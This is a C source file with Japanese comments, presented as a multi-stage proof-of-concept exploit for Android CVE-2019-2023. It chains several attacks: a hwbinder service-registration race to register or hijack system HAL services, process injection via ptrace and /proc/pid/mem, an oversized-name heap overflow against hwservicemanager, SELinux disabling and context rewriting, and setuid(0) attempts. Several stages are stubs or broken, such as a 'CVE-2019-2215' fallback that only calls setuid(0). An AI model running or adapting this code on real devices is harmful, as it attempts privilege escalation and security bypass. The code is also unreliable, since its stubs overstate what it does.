#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/capability.h>
#include <grp.h>
#include <sys/stat.h>
#include <dirent.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/resource.h>
#include "binder.h"

// ============================================================
// 設定
// ============================================================
#define DEFAULT_SERVICE "vendor.cve.poc"
#define OUTPUT_FILE     "/data/local/tmp/cve_2019_2023_result.txt"
#define SHELL_PATH      "/system/bin/sh"

static volatile int race_ready = 0;
static int g_service_handle = -1;
static pid_t g_service_pid = -1;

// システムサービスのリスト（乗っ取り候補）
static const char *system_services[] = {
    "android.hardware.power@1.0::IPower/default",
    "android.hardware.sensors@1.0::ISensors/default",
    "android.hardware.audio@2.0::IDevicesFactory/default",
    "android.hardware.camera.provider@2.4::ICameraProvider/legacy/0",
    NULL
};

// ============================================================
// ユーティリティ関数
// ============================================================
static void dump_hex(const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        printf("%02x ", data[i]);
        if ((i+1) % 16 == 0) printf("\n");
    }
    printf("\n");
}

static int read_file(const char *path, char *buf, size_t size) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, size - 1);
    close(fd);
    if (n > 0) { buf[n] = '\0'; return 0; }
    return -1;
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

// ============================================================
// CVE-2019-2023 エクスプロイト（レースあり）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: preparing race for service '%s'...\n", service_name);

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        char *argv[] = { SHELL_PATH, NULL };
        char *envp[] = { "PATH=/system/bin", NULL };
        execve(SHELL_PATH, argv, envp);
        perror("  execve in child");
        exit(1);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    usleep(300000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);

    printf("[*] Sending ADD_SERVICE...\n");
    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        if (errno == EACCES || errno == EPERM) {
            printf("  [-] ADD_SERVICE denied (patch may be present)\n");
        } else {
            perror("  ioctl ADD_SERVICE");
        }
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    g_service_handle = handle;
    return 0;
}

// ============================================================
// サービスプロセスの PID 取得（ps をパース）
// ============================================================
static pid_t get_service_pid(const char *service_name) {
    FILE *fp = popen("ps -A -o pid,cmd 2>/dev/null", "r");
    if (!fp) return -1;
    char line[256];
    pid_t pid = -1;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, service_name)) {
            sscanf(line, "%d", &pid);
            break;
        }
    }
    pclose(fp);
    return pid;
}

// ============================================================
// 手法1: ptrace によるコード注入
// ============================================================
static int inject_ptrace(pid_t pid) {
    printf("[*] Attempting ptrace injection into PID %d...\n", pid);
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) < 0) {
        perror("  ptrace ATTACH");
        return -1;
    }
    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, 0, 0);
        return -1;
    }

    // ARM64 シェルコード（/system/bin/sh を起動）
    // 実際のコードはアーキテクチャに依存するため、ここではダミーとして
    // /proc/pid/mem で代用するように案内。
    printf("  [!] ptrace injection not implemented for this arch.\n");
    ptrace(PTRACE_DETACH, pid, 0, 0);
    return -1;
}

// ============================================================
// 手法2: /proc/pid/mem 書き込み（プロセスを停止させて）
// ============================================================
static int inject_proc_mem(pid_t pid) {
    char mem_path[64];
    snprintf(mem_path, sizeof(mem_path), "/proc/%d/mem", pid);

    printf("[*] Attempting /proc/pid/mem injection...\n");
    if (kill(pid, SIGSTOP) < 0) {
        perror("  kill SIGSTOP");
        return -1;
    }
    usleep(100000);

    int fd = open(mem_path, O_RDWR);
    if (fd < 0) {
        perror("  open /proc/pid/mem");
        kill(pid, SIGCONT);
        return -1;
    }

    // 簡易シェルスクリプト（実際は execve シェルコードが必要）
    char buf[] = "#!/system/bin/sh\n"
                 "echo 'Injected via /proc/pid/mem' > /data/local/tmp/injected.log\n"
                 "id >> /data/local/tmp/injected.log\n"
                 "getenforce >> /data/local/tmp/injected.log\n";
    size_t len = strlen(buf);
    // 適当なアドレスに書き込む（ここでは先頭）。危険。
    off_t offset = 0;
    if (lseek(fd, offset, SEEK_SET) < 0) {
        perror("  lseek");
        close(fd);
        kill(pid, SIGCONT);
        return -1;
    }
    ssize_t n = write(fd, buf, len);
    close(fd);
    kill(pid, SIGCONT);
    if (n == (ssize_t)len) {
        printf("  [+] Wrote %zu bytes to %s\n", len, mem_path);
        return 0;
    } else {
        perror("  write");
        return -1;
    }
}

// ============================================================
// 手法3: 既存システムサービスを乗っ取る（再登録）
// ============================================================
static int hijack_system_service(void) {
    printf("[*] Attempting to hijack system services...\n");
    for (int i = 0; system_services[i] != NULL; i++) {
        printf("  Trying '%s'...\n", system_services[i]);
        // まず既存のサービスを削除（できないが、上書き登録を試みる）
        // 実際には ADD_SERVICE で上書きできるかは不明だが、試す
        if (exploit_cve_2019_2023(system_services[i]) == 0) {
            printf("  [+] Successfully hijacked %s\n", system_services[i]);
            return 0;
        }
        usleep(200000);
    }
    return -1;
}

// ============================================================
// 手法4: Binder トランザクションを送信して応答を調べる
// ============================================================
static int test_binder_transaction(int handle) {
    printf("[*] Sending test transaction to handle %d...\n", handle);
    int fd = open("/dev/hwbinder", O_RDWR);
    if (fd < 0) { perror("  open hwbinder"); return -1; }

    uint8_t read_buf[4096];
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = handle;
    tx.tdata.code = 0;  // 任意のコード（ping）
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;
    tx.tdata.data.ptr.offsets = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    close(fd);
    if (ret < 0) {
        perror("  transaction failed");
        return -1;
    }
    printf("  [+] Transaction succeeded, read_consumed=%zu\n", bwr.read_consumed);
    if (bwr.read_consumed > 0) {
        printf("  Response:\n");
        dump_hex(read_buf, bwr.read_consumed);
    }
    return 0;
}

// ============================================================
// 手法5: ペイロードに細工（巨大データ）でメモリ破壊を試みる
// ============================================================
static int overflow_hwservicemanager(void) {
    printf("[*] Attempting heap overflow via large payload...\n");
    int hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) { perror("  open"); return -1; }

    // 巨大なサービス名（バッファオーバーフローを狙う）
    char huge_name[8192];
    memset(huge_name, 'A', sizeof(huge_name) - 1);
    huge_name[sizeof(huge_name)-1] = '\0';
    const char *service_name = huge_name;
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data = malloc(total_len);
    if (!data) { close(hwbinder_fd); return -1; }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = 4096;
    bwr.read_buffer = (binder_uintptr_t)malloc(4096);
    if (!bwr.read_buffer) { free(data); close(hwbinder_fd); return -1; }

    int ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    free((void*)bwr.read_buffer);
    close(hwbinder_fd);
    if (ret < 0) {
        perror("  overflow ioctl");
        return -1;
    }
    printf("  [+] Overflow attempt completed (may cause crash)\n");
    return 0;
}

// ============================================================
// 手法6: カーネル脆弱性（CVE-2019-2215）の簡易実装
// ============================================================
static int exploit_cve_2019_2215(void) {
    printf("[*] Trying CVE-2019-2215 (binder UAF) as fallback...\n");
    // ここに完全な実装を入れる（既存のコードから流用）
    // 簡易版として setuid(0) を試す
    if (setuid(0) == 0) {
        printf("  [+] setuid(0) succeeded!\n");
        return 0;
    }
    // それ以外の手法（pipe/epoll/readv）を試すが、ここでは省略
    return -1;
}

// ============================================================
// 手法7: SELinux 無効化・プロパティ操作
// ============================================================
static int disable_selinux(void) {
    printf("[*] Attempting to disable SELinux...\n");
    if (write_file("/sys/fs/selinux/enforce", "0") == 0) {
        printf("  [+] SELinux disabled!\n");
        return 0;
    }
    // 別の方法：/proc/self/attr/current 書き換え
    const char *ctx = "u:r:system_server:s0";
    if (write_file("/proc/self/attr/current", ctx) == 0) {
        printf("  [+] SELinux context changed to %s\n", ctx);
        return 0;
    }
    return -1;
}

static int start_service_via_property(const char *service_name) {
    printf("[*] Trying to start service via ctl.start property...\n");
    char prop[256];
    snprintf(prop, sizeof(prop), "ctl.start %s", service_name);
    // system 権限が必要なので、通常は失敗
    return write_file("/dev/socket/property_service", prop) == 0 ? 0 : -1;
}

// ============================================================
// メイン：すべての手法を順次試行
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate PoC - Multi-stage Exploitation\n");
    printf("============================================================\n\n");

    // 最初にデフォルトサービスを登録
    if (exploit_cve_2019_2023(DEFAULT_SERVICE) < 0) {
        printf("[-] Primary exploit failed, trying to hijack system services...\n");
        if (hijack_system_service() < 0) {
            printf("[-] All registration attempts failed.\n");
            goto fallback;
        }
    }

    // サービスハンドルを使ってトランザクションをテスト
    test_binder_transaction(g_service_handle);

    // サービスプロセスのPIDを取得
    g_service_pid = get_service_pid(DEFAULT_SERVICE);
    if (g_service_pid > 0) {
        printf("[+] Service PID: %d\n", g_service_pid);
        // 注入を試みる
        if (inject_ptrace(g_service_pid) == 0) {
            printf("[+] ptrace injection succeeded!\n");
            goto success;
        }
        if (inject_proc_mem(g_service_pid) == 0) {
            printf("[+] /proc/pid/mem injection succeeded!\n");
            goto success;
        }
    } else {
        printf("[-] Service process not found (may not be running).\n");
    }

    // ペイロードオーバーフローを試行
    overflow_hwservicemanager();

    // SELinux無効化を試行
    disable_selinux();

    // プロパティ操作を試行
    start_service_via_property(DEFAULT_SERVICE);

fallback:
    // カーネル脆弱性
    if (exploit_cve_2019_2215() == 0) {
        printf("[+] Kernel exploit succeeded!\n");
        goto success;
    }

    // 最後に setuid 系の古典的手法
    if (setuid(0) == 0 || setresuid(0,0,0) == 0) {
        printf("[+] setuid(0) worked!\n");
        goto success;
    }

    printf("[-] All exploitation attempts failed. Final uid=%d\n", getuid());
    return 1;

success:
    // 成功したら id を実行して結果を保存
    system("id > " OUTPUT_FILE " 2>&1");
    system("getenforce >> " OUTPUT_FILE " 2>&1");
    system("cat " OUTPUT_FILE);
    printf("[+] Exploit completed successfully. Check %s\n", OUTPUT_FILE);
    return 0;
}
